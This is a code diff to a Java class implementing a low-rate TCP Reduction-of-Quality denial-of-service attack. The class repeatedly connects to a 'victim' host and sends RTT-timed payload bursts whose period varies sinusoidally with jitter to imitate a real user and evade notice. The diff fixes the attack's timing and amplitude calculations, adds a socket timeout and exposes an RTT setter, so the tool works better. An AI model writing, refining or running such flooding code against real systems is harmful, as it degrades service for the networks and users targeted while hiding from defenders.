@@ -28,7 +28,7 @@ public class TCPRoQ {
 	
 
 	//Internals
-	private int RTT;
+	volatile private static int RTT;
 	private boolean attacking = false;
 	
 	private TCPRoQ (Builder builder) {
@@ -49,14 +49,13 @@ public class TCPRoQ {
 	public void InitiateAttack() {
 		attacking = true;
 		if (!workerThread.isAlive()) {
-			workerThread = new Thread(work);
+			workerThread = new Thread(work, "Attack Thread");
 			workerThread.start();
 		}
 	}
 	
 	public void EndAttack() {
 		attacking = false;
-		workerThread.interrupt();
 	}
 	
 	private Runnable work = new Runnable() {
@@ -66,6 +65,7 @@ public class TCPRoQ {
 				try {
 					//Establish a connection to our victim
 					socket = new Socket(host, port);
+					socket.setSoTimeout(2000);
 				
 					/*
 					  Connection established, now the idea is to repeatedly send requests at an amplitude (rate)
@@ -75,12 +75,12 @@ public class TCPRoQ {
 					  
 					  period will vary sinusoidally between 8 ~ 20 RTT with a jitter of ±2 in order to simulate a real user 
 					*/
-					int c = 0;					
+					int c = random.nextInt(12);					
 					OutputStream out = socket.getOutputStream();
 					long l = 0;
 					while (socket.isConnected() && attacking) {
 						//calculate the period for this attack round (in ms).
-						period = (RTT * ((8 + (int) Math.ceil(Math.sin(c / 12) * 12)) + (2 - random.nextInt(4))));
+						period = (RTT * ((8 + (int) Math.ceil(Math.sin(c / 12f) * 12)) + (2 - random.nextInt(4))));
 						
 						if (++c > 12) c = 0;
 						
@@ -88,7 +88,7 @@ public class TCPRoQ {
 						duration = (int) Math.ceil(RTT * (1 + random.nextFloat()));
 						
 						//calulate the amplitude for this attack
-						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.length / 40));
+						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.length * .008f));
 						
 						//calculate the timeout
 						timeout = period - duration;
@@ -117,6 +117,10 @@ public class TCPRoQ {
 			}
 		}
 	};
+	
+	public static void setRTT(final int r) {
+		RTT = r;
+	}
 	
 	public static class Builder {
 		public Builder() {}
